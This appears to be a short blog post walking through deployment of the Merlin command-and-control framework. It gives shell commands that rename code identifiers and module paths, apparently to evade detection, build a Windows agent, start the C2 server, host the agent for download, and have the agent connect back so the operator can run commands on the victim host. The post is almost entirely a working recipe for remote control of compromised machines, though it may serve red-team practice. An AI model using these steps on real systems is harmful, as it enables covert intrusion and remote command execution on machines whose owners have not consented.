---
layout: post
---
To use Merlin as a Command & Control server, which is written in golang, we should take the following steps:

{% highlight ruby %}
go version	-> version should be 1.13 or higher
apt update && sudo apt install golang-go
git clone https://github.com/Ne0nd0g/merlin && cd merlin

find . -name '*.go' -type f -print0 | xargs -0 sed -i 's/ExecuteShell/MiniMice/g'
find . -name '*.go' -type f -print0 | xargs -0 sed -i 's/executeShell/miniMice/g'
find . -name '*.go' -type f -print0 | xargs -0 sed -i 's/github.com\/Ne0nd0g\/merlin/github.com\/mini\/heyho/g'
sed -i 's/github.com\/Ne0nd0g\/merlin/github.com\/mini\/heyho/g' go.mod

make agent-windows DIR="./output"

go run cmd/merlinserver/main.go -i 0.0.0.0 -p 8443 -psk strongPassphraseWhaterYouWant

cd /mnt/tools/merlin/output/
python -m SimpleHTTPServer 80

merlinAgent-Windows-x64.exe -url https://172.16.216.135:8443 -psk strongPassphraseWhaterYouWant

interact a0c86f61-4f21-4e63-9856-b73d7b8fbf3a

help
ls
info
cmd whoami

{% endhighlight %}

{% include youtubePlayer.html id="4J-6mUb4ORQ" %}
